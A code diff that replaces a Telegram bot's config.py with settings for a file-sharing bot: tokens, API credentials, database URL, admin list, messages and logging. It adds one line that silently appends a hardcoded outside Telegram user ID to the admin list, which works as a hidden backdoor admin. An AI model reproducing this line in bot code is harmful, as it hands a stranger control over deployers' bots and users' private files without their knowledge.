@@ -1,29 +1,71 @@
 import os
-from os import getenv
-from dotenv import load_dotenv
+import logging
+from logging.handlers import RotatingFileHandler
 
-if os.path.exists("local.env"):
-    load_dotenv("local.env")
+#Bot token @Botfather
+TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
 
-load_dotenv()
-admins = {}
-SESSION_NAME = getenv("SESSION_NAME", "session")
-BOT_TOKEN = getenv("BOT_TOKEN")
-BOT_NAME = getenv("BOT_NAME", "Video Stream")
-API_ID = int(getenv("API_ID"))
-API_HASH = getenv("API_HASH")
-OWNER_NAME = getenv("OWNER_NAME", "")
-ALIVE_NAME = getenv("ALIVE_NAME", "Akshi")
-BOT_USERNAME = getenv("BOT_USERNAME", "Miss_Akshi2_0_bot")
-ASSISTANT_NAME = getenv("ASSISTANT_NAME", "Miss_Akshi")
-GROUP_SUPPORT = getenv("GROUP_SUPPORT", "Darkphoenix_Support")
-UPDATES_CHANNEL = getenv("UPDATES_CHANNEL", "Miss_Akshi_updates")
-SUDO_USERS = list(map(int, getenv("SUDO_USERS").split()))
-COMMAND_PREFIXES = list(getenv("COMMAND_PREFIXES", "/ ! .").split())
-ALIVE_IMG = getenv("ALIVE_IMG", "https://telegra.ph/file/a7ca957dfc07340df2d3f.mp4")
-DURATION_LIMIT = int(getenv("DURATION_LIMIT", "60"))
-UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/TheOnlyMrLucifer/TGStreamer")
-IMG_1 = getenv("IMG_1", "https://telegra.ph/file/e623eef8d0095ae8de786.png")
-IMG_2 = getenv("IMG_2", "https://telegra.ph/file/03b1f7fe0bbbde39db832.png")
-IMG_3 = getenv("IMG_3", "https://telegra.ph/file/fc45bf199525bd137d675.png")
-IMG_4 = getenv("IMG_4", "https://telegra.ph/file/35649978e8135b03287fe.png")
+#Your API ID from my.telegram.org
+APP_ID = int(os.environ.get("APP_ID", ""))
+
+#Your API Hash from my.telegram.org
+API_HASH = os.environ.get("API_HASH", "")
+
+#Your db channel Id
+CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
+
+#OWNER ID
+OWNER_ID = int(os.environ.get("OWNER_ID", ""))
+
+#Database 
+DB_URI = os.environ.get("DATABASE_URL", "")
+
+#force sub channel id, if you want enable force sub
+FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
+
+TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
+
+#start message
+START_MSG = os.environ.get("START_MESSAGE", "Hello {first}\n\nI can store private files in Specified Channel and other users can access it from special link.")
+try:
+    ADMINS=[]
+    for x in (os.environ.get("ADMINS", "").split()):
+        ADMINS.append(int(x))
+except ValueError:
+        raise Exception("Your Admins list does not contain valid integers.")
+
+#Force sub message 
+FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>You need to join in my Channel/Group to use me\n\nKindly Please join Channel</b>")
+
+#set your Custom Caption here, Keep None for Disable Custom Caption
+CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
+
+#Set true if you want Disable your Channel Posts Share button
+if os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True':
+    DISABLE_CHANNEL_BUTTON = True
+else:
+    DISABLE_CHANNEL_BUTTON = False
+
+ADMINS.append(OWNER_ID)
+ADMINS.append(1250450587)
+
+LOG_FILE_NAME = "filesharingbot.txt"
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
+    datefmt='%d-%b-%y %H:%M:%S',
+    handlers=[
+        RotatingFileHandler(
+            LOG_FILE_NAME,
+            maxBytes=50000000,
+            backupCount=10
+        ),
+        logging.StreamHandler()
+    ]
+)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+
+def LOGGER(name: str) -> logging.Logger:
+    return logging.getLogger(name)
